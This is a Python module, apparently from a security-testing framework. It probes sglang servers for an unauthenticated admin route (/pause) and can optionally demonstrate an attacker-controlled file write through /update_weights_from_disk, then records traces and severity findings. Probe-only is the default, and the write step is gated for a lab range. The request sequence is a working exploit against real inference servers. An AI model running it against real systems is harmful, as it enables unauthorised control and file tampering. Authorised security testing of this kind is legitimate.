"""sglang-omni 目录写 — 管理面 fail-open + profiler 事件目录任意写。

Ruling: 实验室以 sglang /pause 承载 fail-open 判定、/update_weights_from_disk 承载「管理面放行的磁盘路径写」（同类：管理面放行的攻击者可控路径写；两路由靶场 writes=False，写演示仅 backup-write）。
"""
from __future__ import annotations

import json
import time
import urllib.error
import urllib.request
from pathlib import Path

KEY = "sglang-omni-profiler-write"
WRITES = True
TIMEOUT = 3


def _mask(value) -> str:
    """凭据脱敏：MOCK 前缀 + 尾 4 位；全文仅存证据 trace（归档层）。"""
    s = str(value)
    return f"MOCK****{s[-4:]}" if len(s) > 8 else "MOCK****"


def _resolve_mode(params: dict) -> tuple[str, str]:
    """backup-write 仅当模块 writes=True 且提供 backup_targets；否则降级 probe-only。"""
    if params.get("mode") != "backup-write":
        return "probe-only", ""
    if WRITES and params.get("backup_targets"):
        return "backup-write", ""
    return "probe-only", "降级probe-only（backup-write 需 backup_targets）"


def _target(params: dict) -> str:
    return str(params.get("target") or "").rstrip("/")


class Trace:
    """HTTP 全量 trace（请求+响应+错误），写 ctx['run'].dir/traces/<key>.json 后作 artifact。"""

    def __init__(self, ctx: dict):
        d = Path(ctx["run"].dir) / "traces"
        d.mkdir(parents=True, exist_ok=True)
        self.path = d / f"{KEY}.json"
        self.entries: list[dict] = []

    def call(self, method: str, url: str, body=None, headers: dict | None = None):
        entry = {"ts": round(time.time(), 3), "method": method, "url": url,
                 "body": body, "headers": dict(headers or {})}
        data = json.dumps(body).encode("utf-8") if body is not None else None
        req = urllib.request.Request(url, data=data, method=method)
        if data is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                raw, status = resp.read(), resp.status
        except urllib.error.HTTPError as exc:
            raw, status = exc.read(), exc.code
        except Exception as exc:
            entry.update(status=0, error=f"{type(exc).__name__}: {exc}")
            self.entries.append(entry)
            return entry
        text = raw.decode("utf-8", "replace")
        try:
            payload = json.loads(text)
        except ValueError:
            payload = text
        entry.update(status=status, response=payload)
        self.entries.append(entry)
        return entry

    def dump(self) -> Path:
        self.path.write_text(
            json.dumps({"module": KEY, "entries": self.entries}, ensure_ascii=False, indent=1),
            encoding="utf-8")
        return self.path


def _ok(entry: dict | None) -> bool:
    return entry is not None and entry.get("status") == 200


def _resp(entry: dict | None) -> dict:
    r = (entry or {}).get("response")
    return r if isinstance(r, dict) else {}


def run(ctx: dict, params: dict) -> dict:
    target = _target(params)
    mode, note = _resolve_mode(params)
    if not target:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    marker = str(ctx.get("marker") or "INKBLADE")
    t = Trace(ctx)
    gate = t.call("POST", f"{target}/pause", {})
    write = None
    if mode == "backup-write" and _ok(gate):
        write = t.call("POST", f"{target}/update_weights_from_disk", {
            "path": f"/tmp/inkblade-profiler/{marker}/events.trace",
            "relative_path": f"profiler/{marker}",
        })
    findings = []
    if _ok(gate) and _ok(write):
        detail = {"gate_route": "/pause(fail-open)", "write_route": "/update_weights_from_disk",
                  "path": f"/tmp/inkblade-profiler/{marker}/events.trace",
                  "note": "管理面放行 + profiler 事件目录任意写（同构：攻击者可控路径的服务端写）"}
        findings.append({"sev": "high", "title": "sglang-omni：管理面 fail-open + profiler 事件目录任意写原语",
                         "detail": json.dumps(detail, ensure_ascii=False)})
    elif _ok(gate):
        detail = {"gate_route": "/pause(fail-open)", "write_route": "/update_weights_from_disk",
                  "note": "管理面 fail-open 成立（写原语前置），probe-only 未执行写入"}
        findings.append({"sev": "medium", "title": "sglang-omni：管理面 fail-open（写原语前置成立，未执行写入）",
                         "detail": json.dumps(detail, ensure_ascii=False)})
    artifact = t.dump()
    summary = (f"fail-open(/pause)={gate.get('status')} "
               f"写演示={write.get('status') if write else 'skipped'} mode={mode}")
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
